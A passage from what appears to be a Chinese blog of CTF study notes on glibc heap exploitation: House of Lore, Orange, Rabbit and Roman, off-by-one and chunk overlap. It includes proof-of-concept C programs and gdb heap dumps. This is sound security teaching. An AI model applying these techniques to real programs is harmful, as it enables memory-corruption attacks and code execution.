为我们指定内存地址的 fake chunk，并且同时满足之后的 bck-&gt;fd != victim 的检测，那么我们就可以使得 small bin 的 bk 恰好为我们构造的 fake chunk。也就是说，当下一次申请 small bin 的时候，我们就会分配到指定位置的 fake chunk。 攻击过程代码示例代码如下： #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;void jackpot(){ puts(\"Nice jump d00d\"); exit(0); }int main(int argc, char * argv[]){ intptr_t* stack_buffer_1[4] = {0}; intptr_t* stack_buffer_2[3] = {0}; fprintf(stderr, \"\\nWelcome to the House of Lore\\n\"); fprintf(stderr, \"This is a revisited version that bypass also the hardening check introduced by glibc malloc\\n\"); fprintf(stderr, \"This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23\\n\\n\"); fprintf(stderr, \"Allocating the victim chunk\\n\"); intptr_t *victim = malloc(100); fprintf(stderr, \"Allocated the first small chunk on the heap at %p\\n\", victim); // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk intptr_t *victim_chunk = victim-2; fprintf(stderr, \"stack_buffer_1 at %p\\n\", (void*)stack_buffer_1); fprintf(stderr, \"stack_buffer_2 at %p\\n\", (void*)stack_buffer_2); fprintf(stderr, \"Create a fake chunk on the stack\"); fprintf(stderr, \"Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted in second to the last malloc, which putting stack address on smallbin list\\n\"); stack_buffer_1[0] = 0; stack_buffer_1[1] = 0; stack_buffer_1[2] = victim_chunk; fprintf(stderr, \"Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake chunk on stack\"); stack_buffer_1[3] = (intptr_t*)stack_buffer_2; stack_buffer_2[2] = (intptr_t*)stack_buffer_1; fprintf(stderr, \"Allocating another large chunk in order to avoid consolidating the top chunk with the small one during the free()\\n\"); void *p5 = malloc(1000); fprintf(stderr, \"Allocated the large chunk on the heap at %p\\n\", p5); fprintf(stderr, \"Freeing the chunk %p, it will be inserted in the unsorted bin\\n\", victim); free((void*)victim); fprintf(stderr, \"\\nIn the unsorted bin the victim's fwd and bk pointers are nil\\n\"); fprintf(stderr, \"victim-&gt;fwd: %p\\n\", (void *)victim[0]); fprintf(stderr, \"victim-&gt;bk: %p\\n\\n\", (void *)victim[1]); fprintf(stderr, \"Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\\n\"); fprintf(stderr, \"This means that the chunk %p will be inserted in front of the SmallBin\\n\", victim); void *p2 = malloc(1200); fprintf(stderr, \"The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\\n\", p2); fprintf(stderr, \"The victim chunk has been sorted and its fwd and bk pointers updated\\n\"); fprintf(stderr, \"victim-&gt;fwd: %p\\n\", (void *)victim[0]); fprintf(stderr, \"victim-&gt;bk: %p\\n\\n\", (void *)victim[1]); //------------VULNERABILITY----------- fprintf(stderr, \"Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\\n\"); victim[1] = (intptr_t)stack_buffer_1; // victim-&gt;bk is pointing to stack //------------------------------------ fprintf(stderr, \"Now allocating a chunk with size equal to the first one freed\\n\"); fprintf(stderr, \"This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\\n\"); void *p3 = malloc(100); fprintf(stderr, \"This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\\n\"); char *p4 = malloc(100); fprintf(stderr, \"p4 = malloc(100)\\n\"); fprintf(stderr, \"\\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\\n\", stack_buffer_2[2]); fprintf(stderr, \"\\np4 is %p and should be on the stack!\\n\", p4); // this chunk will be allocated on stack intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode memcpy((p4+40), &amp;sc, 8); // This bypasses stack-smash detection since it jumps over the canary} 需要注意的是： 1、void *p5 = malloc(1000); 是为了防止和 victim_chunk 之后和 top_chunk 合并。 2、free((void*)victim)，victim 会被放入到 unsort bin 中去，然后下一次分配的大小如果比它大，那么将从 top chunk 上分配相应大小，而该 chunk 会被取下 link 到相应的 bin 中。如果比它小 (相等则直接返回)，则从该 chunk 上切除相应大小，并返回相应 chunk，剩下的成为 last reminder chunk , 还是存在 unsorted bin 中。 House of OrangeHouse of Orange 与其他的 House of XX 利用方法不同，这种利用方法来自于 Hitcon CTF 2016 中的一道同名题目。由于这种利用方法在此前的 CTF 题目中没有出现过，因此之后出现的一系列衍生题目的利用方法我们称之为 House of Orange。 概述House of Orange 的利用比较特殊，首先需要目标漏洞是堆上的漏洞但是特殊之处在于题目中不存在 free 函数或其他释放堆块的函数。我们知道一般想要利用堆漏洞，需要对堆块进行 malloc 和 free 操作，但是在 House of Orange 利用中无法使用 free 函数，因此 House of Orange 核心就是通过漏洞利用获得 free 的效果。 原理如前面所述，House of Orange 的核心在于在没有 free 函数的情况下得到一个释放的堆块 (unsorted bin)。 这种操作的原理简单来说是当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。 详细过程：假设目前的 top chunk 已经不满足 malloc 的分配需求。 首先我们在程序中的malloc调用会执行到 libc.so 的_int_malloc函数中，在_int_malloc函数中，会依次检验 fastbin、small bins、unsorted bin、large bins 是否可以满足分配要求，因为尺寸问题这些都不符合。接下来_int_malloc函数会试图使用 top chunk，在这里 top chunk 也不能满足分配的要求，因此会执行如下分支： /*Otherwise, relay to handle system-dependent cases*/else { void *p = sysmalloc(nb, av); if (p != NULL &amp;&amp; __builtin_expect (perturb_byte, 0)) alloc_perturb (p, bytes); return p;} 此时 ptmalloc 已经不能满足用户申请堆内存的操作，需要执行 sysmalloc 来向系统申请更多的空间。 但是对于堆来说有 mmap 和 brk 两种分配方式，我们需要让堆以 brk 的形式拓展，之后原有的 top chunk 会被置于 unsorted bin 中。 综上，我们要实现 brk 拓展 top chunk，但是要实现这个目的需要绕过一些 libc 中的 check。 首先，malloc 的尺寸不能大于mmp_.mmap_threshold if ((unsigned long)(nb) &gt;= (unsigned long)(mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)) ... 如果所需分配的 chunk 大小大于 mmap 分配阈值，默认为 128K，并且当前进程使用 mmap() 分配的内存块小于设定的最大值，将使用 mmap() 系统调用直接向操作系统申请内存。 在 sysmalloc 函数中存在对 top chunk size 的 check，如下： assert((old_top == initial_top(av) &amp;&amp; old_size == 0) || ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp; prev_inuse(old_top) &amp;&amp; ((unsigned long)old_end &amp; pagemask) == 0)); 这里检查了 top chunk 的合法性，如果第一次调用本函数，top chunk 可能没有初始化，所以可能 old_size 为 0。 如果 top chunk 已经初始化了，那么 top chunk 的大小必须大于等于 MINSIZE，因为 top chunk 中包含了 fencepost，所以 top chunk 的大小必须要大于 MINSIZE。其次 top chunk 必须标识前一个 chunk 处于 inuse 状态，并且 top chunk 的结束地址必定是页对齐的。此外 top chunk 除去 fencepost 的大小必定要小于所需 chunk 的大小，否则在_int_malloc() 函数中会使用 top chunk 分割出 chunk。 我们总结一下伪造的 top chunk size 的要求： 伪造的 size 必须要对齐到内存页 size 要大于 MINSIZE(0x10) size 要小于之后申请的 chunk size + MINSIZE(0x10) size 的 prev inuse 位必须为 1 之后原有的 top chunk 就会执行_int_free从而顺利进入 unsorted bin 中。 示例这里给出了一个示例程序，程序模拟了一个溢出覆盖到 top chunk 的 size 域。我们试图把 size 改小从而实现 brk 扩展，并把原有的 top chunk 放入 unsorted bin 中。 #define fake_size 0x41int main(void){ void *ptr; ptr=malloc(0x10); ptr=(void *)((int)ptr+24); *((long long*)ptr)=fake_size; // overwrite top chunk size malloc(0x60); malloc(0x60);} 这里我们把 top chunk 的 size 覆盖为 0x41。之后申请大于这个尺寸的堆块，即 0x60。 但是当我们执行这个示例时会发现，这个程序并不能利用成功，原因在于 assert 并没有被满足从而抛出了异常。 [#0] 0x7ffff7a42428 → Name: __GI_raise(sig=0x6)[#1] 0x7ffff7a4402a → Name: __GI_abort()[#2] 0x7ffff7a8a2e8 → Name: __malloc_assert(assertion=0x7ffff7b9e150 \"(old_top == initial_top (av) &amp;&amp; old_size == 0) || ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp; prev_inuse (old_top) &amp;&amp; ((unsigned long) old_end &amp; (pagesize - 1)) == 0)\", file=0x7ffff7b9ab85 \"malloc.c\", line=0x95a, function=0x7ffff7b9e998 &lt;__func__.11509&gt; \"sysmalloc\")[#3] 0x7ffff7a8e426 → Name: sysmalloc(nb=0x70, av=0x7ffff7dd1b20 &lt;main_arena&gt;) 我们回头来看一下 assert 的条件，可以发现之前列出的条目都被满足了除了第一条： 1.伪造的size必须要对齐到内存页 什么是对齐到内存页呢？我们知道现代操作系统都是以内存页为单位进行内存管理的，一般内存页的大小是 4kb。那么我们伪造的 size 就必须要对齐到这个尺寸。在覆盖之前 top chunk 的 size 大小是 20fe1，通过计算得知 0x602020+0x20fe0=0x623000 是对于 0x1000（4kb）对齐的。 0x602000: 0x0000000000000000 0x00000000000000210x602010: 0x0000000000000000 0x00000000000000000x602020: 0x0000000000000000 0x0000000000020fe1 &lt;== top chunk0x602030: 0x0000000000000000 0x0000000000000000 因此我们伪造的 fake_size 可以是 0x0fe1、0x1fe1、0x2fe1、0x3fe1 等对 4kb 对齐的 size。而 0x40 不满足对齐，因此不能实现利用。 #define fake_size 0x1fe1int main(void){ void *ptr; ptr=malloc(0x10); ptr=(void *)((int)ptr+24); *((long long*)ptr)=fake_size; malloc(0x2000); malloc(0x60);} 进行分配之后我们可以观察到原来的堆经过了 brk 扩展： //原有的堆0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]//经过扩展的堆0x0000000000602000 0x0000000000646000 0x0000000000000000 rw- [heap] 我们的申请被分配到 0x623010 的位置，同时原有的堆被置入 unsorted bin： [+] unsorted_bins[0]: fw=0x602020, bk=0x602020 → Chunk(addr=0x602030, size=0x1fc0, flags=PREV_INUSE) 因为 unsorted bin 中存在块，所以我们下次的分配会切割这个块： malloc(0x60); 0x602030[+] unsorted_bins[0]: fw=0x602090, bk=0x602090 → Chunk(addr=0x6020a0, size=0x1f50, flags=PREV_INUSE) 可以看到分配的内存是从 unsorted bin 中切割的，内存布局如下： 0x602030: 0x00007ffff7dd2208 0x00007ffff7dd2208 &lt;== 未被清零的unsorted bin链表0x602040: 0x0000000000602020 0x00000000006020200x602050: 0x0000000000000000 0x00000000000000000x602060: 0x0000000000000000 0x00000000000000000x602070: 0x0000000000000000 0x00000000000000000x602080: 0x0000000000000000 0x00000000000000000x602090: 0x0000000000000000 0x0000000000001f51 &lt;== 切割剩下的新unsorted bin0x6020a0: 0x00007ffff7dd1b78 0x00007ffff7dd1b780x6020b0: 0x0000000000000000 0x0000000000000000 其实 house of orange 的要点正在于此，之后的利用因为涉及到_IO_FILE 的知识，放到 IO_FILE 部分进行学习记录。 House of RabbitHouse of rabbit 是一种伪造堆块的技术，一般运用在 fastbin attack 中，因为 unsorted bin 等其它的 bin 有更好的利用手段。 原理我们知道，fastbin 中会把相同的 size 的被释放的堆块用一个单向链表管理，分配的时候会检查 size 是否合理，如果不合理程序就会异常退出。而 house of rabbit 就利用了在 malloc consolidate 的时候 fastbin 中的堆块进行合并时 size 没有进行检查从而伪造一个假的堆块，为进一步的利用做准备。 原作者POC 前提条件： 1、可以修改 fastbin 的 fd 指针或 size 2、可以触发 malloc consolidate(merge top 或 malloc big chunk 等等) 下面来看一下 POC： POC 1: modify the size of fastbin chunk unsigned long* chunk1=malloc(0x40); //0x602000unsigned long* chunk2=malloc(0x40); //0x602050malloc(0x10);free(chunk1);free(chunk2);/* Heap layout0000| 0x602000 --&gt; 0x0 0008| 0x602008 --&gt; 0x51 ('Q')0016| 0x602010 --&gt; 0x0 ..... 0080| 0x602050 --&gt; 0x0 0088| 0x602058 --&gt; 0x51 ('Q')0096| 0x602060 --&gt; 0x602000 --&gt; 0x0 0104| 0x602068 --&gt; 0x0 ...... 0160| 0x6020a0 --&gt; 0x0 0168| 0x6020a8 --&gt; 0x21 ('!')0176| 0x6020b0 --&gt; 0x0 0184| 0x6020b8 --&gt; 0x0 */chunk1[-1]=0xa1; //modify chunk1 size to be 0xa1malloc(0x1000); //allocate a large chunk, trigger malloc consolidate/*Chunk1 overlap with chunk2 nowgdb-peda$ telescope 0x602000 1000000| 0x602000 --&gt; 0x0 0008| 0x602008 --&gt; 0xa1 0016| 0x602010 --&gt; 0x7ffff7dd1c08 --&gt; 0x7ffff7dd1bf8 --&gt; 0x7ffff7dd1be8 --&gt; 0x7ffff7dd1bd8 --&gt; 0x7ffff7dd1bc8 (--&gt; ...)0024| 0x602018 --&gt; 0x7ffff7dd1c08 --&gt; 0x7ffff7dd1bf8 --&gt; 0x7ffff7dd1be8 --&gt; 0x7ffff7dd1bd8 --&gt; 0x7ffff7dd1bc8 (--&gt; ...)0032| 0x602020 --&gt; 0x0 .....0080| 0x602050 --&gt; 0x0 0088| 0x602058 --&gt; 0x51 ('Q')0096| 0x602060 --&gt; 0x7ffff7dd1bb8 --&gt; 0x7ffff7dd1ba8 --&gt; 0x7ffff7dd1b98 --&gt; 0x7ffff7dd1b88 --&gt; 0x7ffff7dd1b78 (--&gt; ...)0104| 0x602068 --&gt; 0x7ffff7dd1bb8 --&gt; 0x7ffff7dd1ba8 --&gt; 0x7ffff7dd1b98 --&gt; 0x7ffff7dd1b88 --&gt; 0x7ffff7dd1b78 (--&gt; ...)0112| 0x602070 --&gt; 0x0 0120| 0x602078 --&gt; 0x0 ....0152| 0x602098 --&gt; 0x0 0160| 0x6020a0 --&gt; 0xa0 0168| 0x6020a8 --&gt; 0x20 (' ')gdb-peda$ heapinfo(0x20) fastbin[0]: 0x0(0x30) fastbin[1]: 0x0(0x40) fastbin[2]: 0x0(0x50) fastbin[3]: 0x0(0x60) fastbin[4]: 0x0(0x70) fastbin[5]: 0x0(0x80) fastbin[6]: 0x0 top: 0x603450 (size : 0x1fbb0) last_remainder: 0x0 (size : 0x0) unsortbin: 0x0(0x050) smallbin[ 3]: 0x602050(0x0a0) smallbin[ 8]: 0x602000 (overlap chunk with 0x602050(freed) )*/ POC 2: modify FD pointer unsigned long* chunk1=malloc(0x40); //0x602000unsigned long* chunk2=malloc(0x100);//0x602050chunk2[1]=0x31; //fake chunk size 0x30chunk2[7]=0x21 //fake chunk's next chunkchunk2[11]=0x21 //fake chunk's next chunk's next chuck/* Heap laylout0000| 0x602000 --&gt; 0x0 0008| 0x602008 --&gt; 0x51 ('Q')0016| 0x602010 --&gt; 0x0 ......0080| 0x602050 --&gt; 0x0 0088| 0x602058 --&gt; 0x111 0096| 0x602060 --&gt; 0x0 0104| 0x602068 --&gt; 0x31 ('1')0112| 0x602070 --&gt; 0x0 ......0144| 0x602090 --&gt; 0x0 0152| 0x602098 --&gt; 0x21 ('!')0160| 0x6020a0 --&gt; 0x0 0168| 0x6020a8 --&gt; 0x0 0176| 0x6020b0 --&gt; 0x0 0184| 0x6020b8 --&gt; 0x21 ('!')0192| 0x6020c0 --&gt; 0x0 ......0352| 0x602160 --&gt; 0x0 0360| 0x602168 --&gt; 0x20ea1*/free(chunk1);chuck1[0]=0x602060;// modify the fd of chunk1/*gdb-peda$ heapinfo(0x20) fastbin[0]: 0x0(0x30) fastbin[1]: 0x0(0x40) fastbin[2]: 0x0(0x50) fastbin[3]: 0x602000 --&gt; 0x602060 (size error (0x30)) --&gt; 0x0*/malloc(5000);// malloc a big chunk to trigger malloc consolidate/*gdb-peda$ heapinfo(0x20) fastbin[0]: 0x0(0x30) fastbin[1]: 0x0(0x40) fastbin[2]: 0x0(0x50) fastbin[3]: 0x0(0x60) fastbin[4]: 0x0(0x70) fastbin[5]: 0x0(0x80) fastbin[6]: 0x0 top: 0x6034f0 (size : 0x1fb10) last_remainder: 0x0 (size : 0x0) unsortbin: 0x0(0x050) smallbin[ 3]: 0x602000(0x030) smallbin[ 1]: 0x602060*/ 原理很简单，就是通过修改 fastbin chunk 的 size(如上面的 POC 1 所示) 直接构造 overlap chunk，或者修改 fd(如面的 POC 2 所示)，让它指向一个 fake chunk，触发 malloc consolidate 之后让这个 fake chunk 成为一个合法的 chunk。 总结House of rabbit 的优点是容易构造 overlap chunk，由于可以基于 fastbin attack，甚至不需要 leak 就可以完成攻击。大家可以通过例题的练习加深对这个攻击的理解。 例题 HITB-GSEC-XCTF 2018 mutepig House of RomanHouse of Roman 这个技巧说简单点其实就是 fastbin attack 和 Unsortbin attack 结合的一个小 trick。 概括该技术用于 bypass ALSR，利用 12-bit 的爆破来达到获取 shell 的目的。且仅仅只需要一个 UAF 漏洞以及能创建任意大小的 chunk 的情况下就能完成利用。","link":"/2020/06/07/%E5%A0%86%E6%BA%A2%E5%87%BA-Housese_Of_XXX/"},{"title":"堆溢出基础","text":"堆溢出是指程序向某个堆块中写入的字节数超过了堆块本身可使用的字节数（之所以是可使用而不是用户申请的字节数，是因为堆管理器会对用户所申请的字节数进行调整，这也导致可利用的字节数都不小于用户申请的字节数），因而导致了数据溢出，并覆盖到物理相邻的高地址的下一个堆块。堆溢出漏洞轻则可以使得程序崩溃，重则可以使得攻击者控制程序执行流程。 不难发现，堆溢出漏洞发生的基本前提是： 程序向堆上写入数据; 写入的数据大小没有被良好地控制。 与栈溢出所不同的是，堆上并不存在返回地址等可以让攻击者直接控制执行流程的数据，因此我们一般无法直接通过堆溢出来控制EIP，一般来说，我们利用堆溢出的策略如下： 1、覆盖与其物理相邻的下一个 chunk 的如下内容： prev_size size，主要有三个比特位，以及该堆块真正的大小：NON_MAIN_ARENA、IS_MAPPED、PREV_INUSE、the True chunk size chunk content，从而改变程序固有的执行流。 2、利用堆中的机制（如unlink等 ）来实现任意地址写入（Write-Anything-Anywhere）或控制堆块中的内容等效果，从而来控制程序的执行流。 关键步骤堆溢出中比较重要的几个步骤如下： 寻找堆分配函数通常来说堆是通过调用glibc函数malloc进行分配的，在某些情况下会使用calloc分配。calloc与malloc的区别是 calloc 在分配后会自动进行清空，这对于某些信息泄露漏洞的利用来说是致命的。 calloc(0x20);//等同于ptr=malloc(0x20);memset(ptr,0,0x20); 除此之外，还有一种分配是经由realloc进行的，realloc函数可以身兼malloc和free两个函数的功能。 #include &lt;stdio.h&gt;int main(void) { char *chunk,*chunk1; chunk=malloc(16); chunk1=realloc(chunk,32); return 0;} realloc的操作并不是像字面意义上那么简单，其内部会根据不同的情况进行不同操作： 1、当 realloc(ptr,size) 的 size 不等于 ptr 的 size 时： 如果申请 size &gt; 原来size： 如果 chunk 与 top chunk 相邻，直接扩展这个 chunk 到新 size 大小； 如果 chunk 与 top chunk 不相邻，相当于 free(ptr),malloc(new_size)。 如果申请 size &lt; 原来 size： 如果相差不足以容得下一个最小 chunk(64 位下 32 个字节，32 位下 16 个字节)，则保持不变； 如果相差可以容得下一个最小 chunk，则切割原 chunk 为两部分，free 掉后一部分。 2、当 realloc(ptr,size) 的 size 等于 0 时，相当于 free(ptr)； 3、当 realloc(ptr,size) 的 size 等于 ptr 的 size，不进行任何操作。 寻找危险函数通过寻找危险函数，我们快速确定程序是否可能有堆溢出，以及有的话，堆溢出的位置在哪里。常见的危险函数如下： 输入： gets，直接读取一行，忽略 '\\x00' scanf vscanf 输出： sprintf 字符串处理函数： strcpy，字符串复制，遇到 '\\x00' 停止 strcat，字符串拼接，遇到 '\\x00' 停止 bcopy 确定填充长度这一部分主要是计算我们开始写入的地址与我们所要覆盖的地址之间的距离。 一个常见的误区是 malloc 的参数等于实际分配堆块的大小，但是事实上ptmalloc分配出来的大小是对齐的。这个长度一般是字长的 2 倍，比如 32 位系统是 8 个字节，64 位系统是 16 个字节。但是对于不大于 2 倍字长的请求，malloc 会直接返回 2 倍字长的块也就是最小 chunk，比如 64 位系统执行malloc(0)会返回用户区域为 16 字节的块。 #include &lt;stdio.h&gt;int main(void) { char *chunk; chunk=malloc(0); puts(\"Get input:\"); gets(chunk); return 0;} 堆内存结构如下： //根据系统的位数，malloc会分配8或16字节的用户空间0x602000: 0x0000000000000000 0x00000000000000210x602010: 0x0000000000000000 0x00000000000000000x602020: 0x0000000000000000 0x0000000000020fe10x602030: 0x0000000000000000 0x0000000000000000 注意：chunk_hear.size = 用户区域大小 + 2 * 字长 还有一点是之前所说的用户申请的内存大小会被修改，其有可能会使用与其物理相邻的下一个 chunk 的prev_size字段储存内容。回头再来看下之前的示例代码： #include &lt;stdio.h&gt;int main(void) { char *chunk; chunk=malloc(24); puts(\"Get input:\"); gets(chunk); return 0;} 观察如上代码，我们申请的 chunk 大小是24个字节。但是我们将其编译为 64 位可执行程序时，实际上分配的内存会是 16 个字节而不是 24 个： 0x602000: 0x0000000000000000 0x00000000000000210x602010: 0x0000000000000000 0x00000000000000000x602020: 0x0000000000000000 0x0000000000020fe1 16 个字节的空间是如何装得下 24 个字节的内容呢？答案是借用了下一个块的prev_size域。我们可来看一下用户申请的内存大小与 glibc 中实际分配的内存大小之间的转换： /* pad request bytes into a usable size -- internal version *///MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1#define request2size(req) \\ (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE) \\ ? MINSIZE \\ : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK) 当req=24时，request2size(24)=32。而除去 chunk 头部的 16 个字节。实际上用户可用 chunk 的字节数为 16。而根据我们前面学到的知识可以知道 chunk 的 prev_size 仅当它的前一块处于释放状态时才起作用。所以用户这时候其实还可以使用下一个 chunk 的 prev_size 字段，正好 24 个字节。实际上 ptmalloc 分配内存是以双字为基本单位，以 64 位系统为例，分配出来的空间是 16 的整数倍，即用户申请的 chunk 都是 16 字节对齐的。 堆中的经典漏洞及利用堆同栈一样，存在许多经典的漏洞利用方式，下面对典型的漏洞利用技术进行学习记录。 Off-By-One严格来说off-by-one漏洞是一种特殊的溢出漏洞，off-by-one 指程序向缓冲区中写入时，写入的字节数超过了这个缓冲区本身所申请的字节数并且只越界了一个字节。 漏洞原理off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。其中边界验证不严通常包括： 使用循环语句向堆块中写入数据时，循环的次数设置错误导致多写入了一个字节； 字符串操作不合适（比如strlen()函数计算字符串长度时不考虑结束符\\x00，而strcpy()函数在复制的时候会复制\\x00，二者一起用就会导致off-by-one）。 单字节溢出被认为是难以利用的，但是因为 Linux 的堆管理机制ptmalloc验证的松散性，基于 Linux 堆的 off-by-one 漏洞利用起来并不复杂，并且威力强大。此外，需要说明的一点是off-by-one是可以基于各种缓冲区的，比如栈、bss 段等等，但是堆上的 off-by-one 是 CTF 中比较常见的。我们这里仅讨论堆上的 off-by-one 情况。 利用思路1、溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法； 2、溢出字节为 NULL 字节：在 size 为256的时候，溢出 NULL 字节可以使得 prev_in_use 位（记录前一个 chunk 块是否被分配）被清，这样前块会被认为是 free 块。（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理;（2） 另外，这时 prev_size 域就会启用，就可以伪造 prev_size ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 prev_size 找到的块的大小与prev_size 是否一致。 最新版本代码中，已加入针对 2 中后一种方法的 check ，但是在 2.28 前并没有该 check ： /* consolidate backward */ if (!prev_inuse(p)) { prevsize = prev_size (p); size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); /* 后两行代码在最新版本中加入，则 2 的第二种方法无法使用，但是 2.28 及之前都没有问题 */ if (__glibc_unlikely (chunksize(p) != prevsize)) malloc_printerr (\"corrupted size vs. prev_size while consolidating\"); unlink_chunk (av, p); } Chunk Extend and Overlappingchunk extend是堆漏洞的一种常见利用手法，通过extend可以实现chunk overlapping的效果。这种利用方法需要以下的时机和条件： 程序中存在基于堆的漏洞 漏洞可以控制chunk header中的数据 漏洞原理chunk extend 技术能够产生的原因在于 ptmalloc 在对堆 chunk 进行操作时使用的各种宏。 1、在 ptmalloc 中，获取 chunk 块大小的操作如下，一种是直接获取 chunk 的大小，不忽略掩码部分，另外一种是忽略掩码部分： /* Like chunksize, but do not mask SIZE_BITS. */#define chunksize_nomask(p) ((p)-&gt;mchunk_size)/* Get size, ignoring use bits */#define chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS)) 2、在 ptmalloc 中，获取下一 chunk 块地址的操作如下： /* Ptr to next physical malloc_chunk. */#define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p))) 即使用当前块指针加上当前块大小。 3、在 ptmalloc 中，获取前一个 chunk 信息的操作如下： /* Size of the chunk below P. Only valid if prev_inuse (P). */#define prev_size(p) ((p)-&gt;mchunk_prev_size)/* Ptr to previous physical malloc_chunk. Only valid if prev_inuse (P). */#define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p))) 即通过 malloc_chunk-&gt;prev_size 获取前一块大小，然后使用本 chunk 地址减去所得大小。 4、在 ptmalloc，判断当前 chunk 是否是 use 状态的操作如下： #define inuse(p) ((((mchunkptr)(((char *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE) 即查看下一 chunk 的 prev_inuse 域，而下一块地址又如我们前面所述是根据当前 chunk 的 size 计算得出的。 通过上面几个宏可以看出，ptmalloc 通过 chunk header 的数据判断 chunk 的使用情况和对 chunk 的前后块进行定位。简而言之，chunk extend 就是通过控制 size 和 pre_size 域来实现跨越块操作从而导致 overlapping 的。与 chunk extend 类似的还有一种称为 chunk shrink 的操作。 下面介绍各类型的 extend，参考的环境是 64 位的，因此偏移是 8 字节。 类型1-对 inuse 的 fastbin 进行 extend该利用的效果是通过更改第一个块的大小来控制第二个块的内容。示例程序如下： int main(void){ void *ptr,*ptr1; ptr=malloc(0x10);//分配第一个0x10的chunk malloc(0x10);//分配第二个0x10的chunk *(long long *)((long long)ptr-0x8)=0x41;// 修改第一个块的size域 free(ptr); ptr1=malloc(0x30);// 实现 extend，控制了第二个块的内容 return 0;} 当两个 malloc 语句执行之后，堆的内存分布如下： 0x602000: 0x0000000000000000 0x0000000000000021 &lt;=== chunk 10x602010: 0x0000000000000000 0x00000000000000000x602020: 0x0000000000000000 0x0000000000000021 &lt;=== chunk 20x602030: 0x0000000000000000 0x00000000000000000x602040: 0x0000000000000000 0x0000000000020fc1 &lt;=== top chunk 之后，我们把 chunk1 的 size 域更改为0x41，0x41 是因为 chunk 的 size 域包含了用户控制的大小和 header 的大小。如上所示两个chunk大小之和为 0x40。在题目中这一步可以由堆溢出得到。 0x602000: 0x0000000000000000 0x0000000000000041 &lt;=== 篡改大小0x602010: 0x0000000000000000 0x00000000000000000x602020: 0x0000000000000000 0x00000000000000210x602030: 0x0000000000000000 0x00000000000000000x602040: 0x0000000000000000 0x0000000000020fc1 执行 free 之后，我们可以看到 chunk2 与 chunk1 合成一个 0x40 大小的 chunk，一起释放了： Fastbins[idx=0, size=0x10] 0x00Fastbins[idx=1, size=0x20] 0x00Fastbins[idx=2, size=0x30] ← Chunk(addr=0x602010, size=0x40, flags=PREV_INUSE) Fastbins[idx=3, size=0x40] 0x00Fastbins[idx=4, size=0x50] 0x00Fastbins[idx=5, size=0x60] 0x00Fastbins[idx=6, size=0x70] 0x00 之后我们通过 malloc(0x30) 得到 chunk1+chunk2 的块，此时就可以直接控制 chunk2 中的内容，我们也把这种状态称为 overlapping chunk。 call 0x400450 &lt;malloc@plt&gt;mov QWORD PTR [rbp-0x8], raxrax = 0x602010 类型2-对 inuse 的 smallbin 进行 extend通过之前深入理解堆的实现部分的内容，我们得知处于 fastbin 范围的 chunk 释放后会被置入 fastbin 链表中，而不处于这个范围的 chunk 被释放后会被置于 unsorted bin 链表中。 以下这个示例中，我们使用 0x80 这个大小来分配堆（作为对比，fastbin 默认的最大的 chunk 可使用范围是 0x70） int main(){ void *ptr,*ptr1; ptr=malloc(0x80);//分配第一个 0x80 的chunk1 malloc(0x10); //分配第二个 0x10 的chunk2 malloc(0x10); //防止与top chunk合并 *(int *)((int)ptr-0x8)=0xb1; free(ptr); ptr1=malloc(0xa0);} 在这个例子中，因为分配的 size 不处于 fastbin 的范围，因此在释放时如果与 top chunk 相连会导致和 top chunk 合并。所以我们需要额外分配一个 chunk，把释放的块与 top chunk 隔开。 0x602000: 0x0000000000000000 0x00000000000000b1 &lt;===chunk1 篡改size域0x602010: 0x0000000000000000 0x00000000000000000x602020: 0x0000000000000000 0x00000000000000000x602030: 0x0000000000000000 0x00000000000000000x602040: 0x0000000000000000 0x00000000000000000x602050: 0x0000000000000000 0x00000000000000000x602060: 0x0000000000000000 0x00000000000000000x602070: 0x0000000000000000 0x00000000000000000x602080: 0x0000000000000000 0x00000000000000000x602090: 0x0000000000000000 0x0000000000000021 &lt;=== chunk20x6020a0: 0x0000000000000000 0x00000000000000000x6020b0: 0x0000000000000000 0x0000000000000021 &lt;=== 防止合并的chunk0x6020c0: 0x0000000000000000 0x00000000000000000x6020d0: 0x0000000000000000 0x0000000000020f31 &lt;=== top chunk 释放后，chunk1 把 chunk2 的内容吞并掉并一起置入 unsorted bin： 0x602000: 0x0000000000000000 0x00000000000000b1 &lt;=== 被放入unsorted bin0x602010: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 &lt;=== fd，bk0x602020: 0x0000000000000000 0x00000000000000000x602030: 0x0000000000000000 0x00000000000000000x602040: 0x0000000000000000 